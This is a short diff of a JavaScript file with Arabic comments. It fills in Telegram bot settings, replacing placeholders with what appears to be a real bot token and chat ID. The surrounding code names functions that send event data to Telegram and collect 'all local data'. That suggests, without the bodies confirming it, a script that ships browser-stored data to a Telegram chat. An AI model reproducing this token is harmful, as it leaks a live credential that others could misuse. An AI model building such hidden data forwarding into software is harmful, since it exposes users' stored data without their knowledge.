@@ -1,6 +1,6 @@
 // إعدادات بوت تليجرام
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // ضع توكن البوت هنا
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE'; // ضع معرف الدردشة هنا
+const TELEGRAM_BOT_TOKEN = '8598568990:AAHdirQJ0hBr1xkJAfXoaNcDm3GWMXcqQKg'; // ضع توكن البوت هنا
+const TELEGRAM_CHAT_ID = '7590246763'; // ضع معرف الدردشة هنا
 
 // إرسال البيانات إلى تليجرام
 async function sendTelegramData(eventType, data) {
@@ -242,3 +242,4 @@ function getAllLocalData() {
     
     return allData;
 }
+
